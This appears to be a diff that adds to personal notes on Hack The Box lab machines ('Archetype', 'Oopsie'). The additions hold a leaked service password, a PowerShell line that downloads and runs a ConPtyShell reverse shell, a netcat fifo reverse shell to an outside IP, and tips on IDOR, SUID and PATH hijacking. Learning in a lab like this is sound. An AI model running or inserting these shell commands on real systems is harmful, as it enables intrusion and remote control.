@@ -429,3 +429,36 @@ smbclient \\\\10.129.158.38\\ADMIN$ -U 'administrator'
 * `xp_cmdshell` allows me to spawn a Windows shell.
 
 Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
+
+M3g4c0rp123
+
+-OutFile c:\\Users\Public\\winPEASany.exe
+
+* grep substitute in Windows `C:\> netstat -na | findstr /c:"PORT"`
+
+* To view hidden file in Windows `dir [DIR NAME] /a:h /b /s`
+
+dir /a:h /b /s
+
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.15.189 3001
+
+
+* Oopsie  
+
+* Why I got stuck? 
+  * I didn't think of changing the id in the url I kept trying to guess the Access ID when in reality I could access it by decreasing the id in the url when I'm viewing the access ID of the guest user. 
+
+
+rm /tmp/f;mkfifo /tmp/f;/bin/cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.189 1234 >/tmp/f
+
+
+* `find directory-location -group {group-name} -name {file-name}` this syntax is used to find the files that belong to the group specified.
+
+* SUID (Set owner User ID)
+
+* Add new path to the $PATH variable 
+ `export PATH=/some/new/path:$PATH`
+
+export PATH=/tmp:$PATH
+
+af13b0bee69f8a877c3faf667f7beacf
